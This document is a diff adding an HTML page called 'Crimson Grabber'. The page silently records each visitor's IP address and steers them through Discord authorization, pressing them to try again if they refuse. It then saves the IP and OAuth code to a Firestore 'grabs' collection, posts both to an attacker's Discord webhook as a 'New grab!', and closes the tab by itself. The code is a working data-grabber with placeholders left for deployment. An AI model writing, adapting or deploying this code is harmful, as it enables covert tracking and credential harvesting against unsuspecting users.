@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Crimson Grabber</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 2rem; }
+    .screen { display: none; }
+    .screen.active { display: block; }
+    button { padding: .5rem 1rem; font-size: 1rem; }
+    .denied { color: #900; }
+  </style>
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <!-- 1. Loading → grab IP -->
+  <div id="load-screen" class="screen active">
+    <h2>loading your IP…</h2>
+  </div>
+
+  <!-- 2. Ask for Discord Auth -->
+  <div id="auth-screen" class="screen">
+    <h2>Please authorize with Discord</h2>
+    <button id="authorize-btn">Authorize via Discord</button>
+    <p id="retry-count"></p>
+  </div>
+
+  <!-- 3. Denied Block -->
+  <div id="denied-screen" class="screen">
+    <h2 class="denied">Access Denied</h2>
+    <p>If you refuse 3 times, we really can’t show you the rest of the site.</p>
+    <button id="back-to-auth">Try Again</button>
+  </div>
+
+  <!-- 4. Final Message -->
+  <div id="final-screen" class="screen">
+    <h2>All done!</h2>
+    <p>Thanks, you can close this tab now.</p>
+  </div>
+
+  <!-- 5. Error / 24h Retry -->
+  <div id="error-screen" class="screen">
+    <h2>Authentication Error</h2>
+    <p>Please come back in 24 hours.</p>
+  </div>
+
+  <script>
+  // ────────────────────────────────────────────────────────
+  //  CONFIGURATION (fill these in!)
+  const DISCORD_CLIENT_ID = 'YOUR_DISCORD_CLIENT_ID';
+  const REDIRECT_URI     = 'https://yourdomain.com';  // must match your Discord app
+  const FIREBASE_CONFIG = {
+    apiKey: "...",
+    authDomain: "...",
+    projectId: "...",
+    // etc.
+  };
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/…';
+
+  // ────────────────────────────────────────────────────────
+  //  FIREBASE INIT
+  firebase.initializeApp(FIREBASE_CONFIG);
+  const db = firebase.firestore();
+
+  // ────────────────────────────────────────────────────────
+  //  STATE
+  let userIP = null;
+  let denyCount = 0;
+
+  // ────────────────────────────────────────────────────────
+  //  HELPERS: show one “screen” at a time
+  function show(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  // ────────────────────────────────────────────────────────
+  //  1. On load → grab IP
+  async function grabIP() {
+    try {
+      let res = await fetch('https://api.ipify.org?format=json');
+      let data = await res.json();
+      userIP = data.ip;
+      // console.log('IP =', userIP);
+    } catch (e) {
+      console.warn('Failed to get IP:', e);
+      userIP = 'unknown';
+    }
+    show('auth-screen');
+    updateRetryUI();
+  }
+
+  // ────────────────────────────────────────────────────────
+  //  2. Kick off Discord OAuth2
+  document.getElementById('authorize-btn').onclick = () => {
+    const url = new URL('https://discord.com/api/oauth2/authorize');
+    url.search = new URLSearchParams({
+      client_id:    DISCORD_CLIENT_ID,
+      redirect_uri: REDIRECT_URI,
+      response_type: 'code',
+      scope:         'identify'
+    });
+    window.location.href = url;
+  };
+
+  // ────────────────────────────────────────────────────────
+  //  3. On redirect back? check for code or error
+  async function handleRedirect() {
+    const params = new URLSearchParams(window.location.search);
+    if (params.has('error')) {
+      denyCount++;
+      return showDenyFlow();
+    }
+    if (!params.has('code')) {
+      return;  // fresh load
+    }
+    const code = params.get('code');
+    // NOTE: for real security, exchange this code on your backend.
+    // Here we pretend it worked.
+    show('load-screen');
+    await compileAndExport(code);
+  }
+
+  // ────────────────────────────────────────────────────────
+  function showDenyFlow() {
+    if (denyCount >= 3) {
+      show('denied-screen');
+    } else {
+      updateRetryUI();
+      show('auth-screen');
+    }
+  }
+  document.getElementById('back-to-auth').onclick = () => {
+    show('auth-screen');
+  };
+  function updateRetryUI() {
+    document.getElementById('retry-count').innerText =
+      denyCount ? `Denied ${denyCount} time${denyCount>1?'s':''}` : '';
+  }
+
+  // ────────────────────────────────────────────────────────
+  //  4. compile data → Firebase, then webhook
+  async function compileAndExport(oauthCode) {
+    // save to Firestore
+    try {
+      await db.collection('grabs').add({
+        ip:   userIP,
+        code: oauthCode,
+        ts:   new Date()
+      });
+    } catch (e) {
+      console.error('Firestore error', e);
+    }
+    // send to Discord webhook
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `New grab!\nIP: ${userIP}\nCode: ${oauthCode}`
+        })
+      });
+    } catch (e) {
+      console.error('Webhook error', e);
+      return showErrorAndClose();
+    }
+    // success: final screen then auto-close
+    show('final-screen');
+    setTimeout(() => window.close(), 3000);
+  }
+
+  // ────────────────────────────────────────────────────────
+  //  5. error path → “Retry in 24h”
+  function showErrorAndClose() {
+    show('error-screen');
+    setTimeout(() => window.close(), 5000);
+  }
+
+  // ────────────────────────────────────────────────────────
+  //  kick it off
+  window.addEventListener('load', () => {
+    grabIP();
+    handleRedirect();
+  });
+  </script>
+</body>
+</html>
